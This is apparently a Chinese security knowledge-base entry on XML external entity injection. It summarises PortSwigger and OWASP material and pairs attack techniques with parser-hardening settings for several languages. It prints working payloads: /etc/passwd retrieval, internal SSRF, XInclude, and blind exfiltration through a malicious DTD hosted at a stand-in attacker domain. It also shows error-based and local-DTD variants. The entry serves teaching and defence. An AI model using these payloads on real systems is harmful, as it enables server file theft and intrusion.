# r820A · XXE（XML 外部实体注入，CWE-611）：解析器替攻击者读本地文件与打内网

> 来源：PortSwigger Web Security Academy《What is XXE》+《Finding and exploiting blind XXE》+ OWASP XML External Entity Prevention Cheat Sheet（三篇 WebFetch 200 全文逐字）。落点 `system/si-safety-governance/SKILL.md` §三十 → 2.15.0。SI 模块 · 2026-11-28 实拉。

## 独点1 根因与四类攻击 + 三条隐藏攻击面

**根因**：XML 规范含危险特性，标准解析器即便应用从不使用也支持它们。外部实体（external entity）是值从 DTD 外部加载的自定义实体，可基于文件路径或 URL 定义。OWASP 逐字：「XXE injection occurs when an XML processor resolves an external entity from untrusted input. This can expose local files, cause server-side request forgery (SSRF), or exhaust resources.」CWE-611。

**四类攻击**（PortSwigger 官方分类）：
1. **检索文件**：定义含文件内容的外部实体并在回显字段引用。`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>` → 响应含 `/etc/passwd`。实操须逐个数据节点测试（真实场景 XML 有很多值，任一可能回显）。
2. **SSRF**：`<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">` → 服务器向内网发请求；可回显则双向交互，不可回显则 blind SSRF。
3. **blind XXE 带外外泄**（见独点2）。
4. **blind XXE 报错回显**（见独点2）。

**三条隐藏攻击面**（请求里没有 XML 也可能中）：
- **XInclude**：客户端数据被嵌入服务端 XML 再解析（如塞进后端 SOAP 请求）时无法控制整个文档/无法定义 DOCTYPE，改用在任一数据值里放 `<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`。
- **文件上传**：DOCX/XLSX 等 office 格式、SVG 图像都含 XML 子组件；应用以为收 PNG/JPEG，图像处理库却支持 SVG → 恶意 SVG 即入口。
- **改 Content-Type**：`application/x-www-form-urlencoded` 改成 `text/xml` 且 `foo=bar` 改成 `<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`，服务端容忍即触发。
测试补充：XML 只是传输格式，同功能还要测 XSS/SQLi；payload 可能需 XML 转义序列，也可借 XML 编码混淆绕过弱防御。

## 独点2 Blind XXE：参数实体、带外外带、报错回显与本地 DTD 复用

**Blind 定义**：应用不在响应里返回任何外部实体的值，无法直接检索服务器文件，须用 OAST 带外交互或触发含敏感数据的解析错误。两大路径：

**(a) OAST 带外探测**：`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>` 在受控系统监听 DNS 查询+HTTP 请求。常规实体被输入校验/解析器加固拦下时改用**参数实体**——声明用 `%`（`<!ENTITY % myparameterentity "my parameter entity value" >`）、引用用 `%`（`%myparameterentity;`）且只能在 DTD 内引用：`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`。

**(b) 恶意外部 DTD 带外外泄**：攻击者托管 DTD，再由 in-band payload 引入。恶意 DTD：`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;` —— file 装文件内容、eval 动态声明 exfiltrate（把 file 拼进 URL query）、依次展开求值外带。最终 payload：`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>` 让解析器取回并按内联解释。局限：URL 字符校验会卡换行（`/etc/passwd` 多行），可改用 FTP 协议或改打 `/etc/hostname` 单行文件。

**(c) 报错回显**：`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;` → 抛 `java.io.FileNotFoundException: /nonexistent/root:x:0:0:...` 把文件内容塞进错误文本（前提是应用把错误信息回显）。

**(d) 复用本地 DTD（OOB 被封时）**：嵌套参数实体在内部 DTD 里按 XML 规范**不允许**（外部 DTD 才允许，很多解析器不容忍）。漏洞：当文档 DTD 混合内外部声明时，内部 DTD 可重定义外部 DTD 中已声明的实体，此时嵌套限制被放宽。若 OOB 被封无法取远端 DTD，可指向服务器上真实存在的本地 DTD 文件并复用其已定义实体。例（服务器有 `/usr/local/app/schema.dtd` 定义 `custom_entity`）：`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>`。定位本地 DTD：借错误回显逐个探测（GNOME 常见 `/usr/share/yelp/dtd/docbookx.dtd`），缺文件即报错存在的则拿到后找可重定义实体（开源系统可联网搜 copy）。该手法由 Arseniy Sharoglazov 首创，列 PortSwigger 2018 十大 web hacking 第 7。

## 独点3 防护：禁用 DTD/外部实体为主，逐库配置，配置失败即停

**通用原则**（OWASP Cheat Sheet 逐字）：
- 「Disable document type definitions (DTDs) whenever possible. Reject DOCTYPE declarations if the parser supports it. If your application needs DTDs, disable external entity resolution and external DTD loading, and limit entity expansion.」
- 「Keep XInclude disabled unless explicitly required; it can load resources independently of DTDs.」
- 「Restrict external access during schema validation and style sheet processing as well as XML parsing.」——不只解析阶段。
- 「Treat an unsupported security setting as a configuration failure. Do not continue processing untrusted XML with partial hardening.」
- 「Preventing XXE does not prevent every XML denial-of-service attack.」——防 XXE ≠ 防 XML DoS（亿万笑等见 XML Security Cheat Sheet）。
- 「Pass streams rather than untrusted filenames or URLs: external-entity controls do not restrict access to the initial resource passed directly to a parsing or processing API.」
- 白名单语义：「use a catalog with `RESOLVE=strict` to map approved identifiers to local resources, or an allowlisting resolver.」「Reject unapproved identifiers; returning `null` delegates to default resolution.」「External-access properties restrict protocols, not individual resources: allowing `https` is not a resource allowlist.」

**逐语言/库配置要点**：
- **Java（JAXP 9+）**：DOM `DocumentBuilderFactory` 设 `disallow-doctype-decl=true`+`FEATURE_SECURE_PROCESSING`，`setExpandEntityReferences(false)` 不能替代阻断外部资源；SAX 在 factory 拒 DOCTYPE；StAX `SUPPORT_DTD=false`+`IS_SUPPORTING_EXTERNAL_ENTITIES=false`+抛异常的 resolver（DTD 默认开、外部实体默认未指定；禁 DTD 处理不必然拒 DOCTYPE 声明）；XSLT `ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_STYLESHEET` 设 `""`；Schema 编译与**每个 validator**都要装 resolver（validator 不继承 factory）；`java.beans.XMLDecoder` 禁用于不可信输入（阻外部实体不消反序列化风险）。「Stop processing if any required security setting fails; do not catch the exception and continue parsing.」
- **.NET**：4.5.2 是安全阈值（XDocument/XmlDocument/XmlTextReader/XPathNavigator）；ASP.NET 须 `<httpRuntime targetFramework="..." />` ≥4.5.2，否则「whichever is lower」按较低者算，省略标签也 unsafe-by-default；`<compilation targetFramework>` 不够。XmlDocument 4.5.2 前须 `XmlResolver=null`；XmlTextReader 4.0 前 `ProhibitDtd=true`、4.0–4.5.2 `DtdProcessing=Prohibit`（或 Ignore 跳过）；XmlReader 默认安全。
- **Python**：用 `defusedxml` 替代标准库、`forbid_dtd=True`（不需要 DTD 时）；Expat <2.7.2 有实体膨胀/大 token/动态内存 DoS，「a Python version alone does not establish the linked Expat version」；标准库 `xmlrpc` 易受解压炸弹。
- **PHP**：libxml ≥2.9 默认禁实体替换；禁外部实体用 `libxml_set_external_entity_loader(function(){ return null; })`——直接传 `null` 给该函数**不等于** callback 返回 null，不能阻断加载；勿为不可信 XML 开 `LIBXML_NOENT`/`LIBXML_DTDLOAD`/`LIBXML_DTDVALID`。
- **C/C++ libxml2**：勿开 `XML_PARSE_NOENT`（展开实体）/ `XML_PARSE_DTDLOAD`（载外部 DTD）；2.9 起 XXE 默认禁。Xerces 用 `setDisableDefaultEntityResolution(true)`，自定义 resolver 须拒未批准资源。
- **iOS**：NSXMLDocument 用 `NSXMLNodeLoadExternalEntitiesNever`（iOS4 及以前默认载全部外部实体，iOS5+ 仅不联网的）；iOS6 及以前 libxml2 <2.9。
- **ColdFusion**：无全局设置，每次 XML 函数调用都须传 `ALLOWEXTERNALENTITIES=false`（XmlParse/XmlSearch/XmlTransform/isXML）；Lucee ≥5.4.2.10/6.0.0.514 默认禁。

**验收与声明边界**：所有 XML 解析点（含 schema 校验、XSLT、文件上传 SVG/DOCX、XInclude、Content-Type 容忍）逐一验证 DTD/外部实体/XInclude 关闭；解析失败即停不带部分加固继续。声明不防：XML 实体膨胀 DoS、XSS/SQLi（XML 只是传输格式）、已授权 resolver 主动放行的资源、直接传入解析 API 的不可信初始文件名/URL（外部实体控制管不到）。

**来源与判非**：`https://portswigger.net/web-security/xxe`（WebFetch 200 全文逐字：定义/四类攻击/file 与 SSRF payload/XInclude/SVG 上传/Content-Type/禁用外部实体与 XInclude）· `https://portswigger.net/web-security/xxe/blind`（WebFetch 200 全文逐字：OAST/参数实体 `%`/恶意 DTD 外带/报错回显/本地 DTD 复用/Sharoglazov 2018）· `https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html`（WebFetch 200 全文逐字：CWE-611/禁 DTD/XInclude/逐库配置/配置失败即停/白名单 resolver/协议非资源白名单）。全库 `XXE`/`XML External Entity`/`CWE-611`/`DOCTYPE`/参数实体 0 机制专节（仅 §15.1 借 XXE、§15.3 关 XXE 外部实体两句异命题），豆包自留地 WB 0 落地，按 rules/07「增＝加厚现有」0 新建。
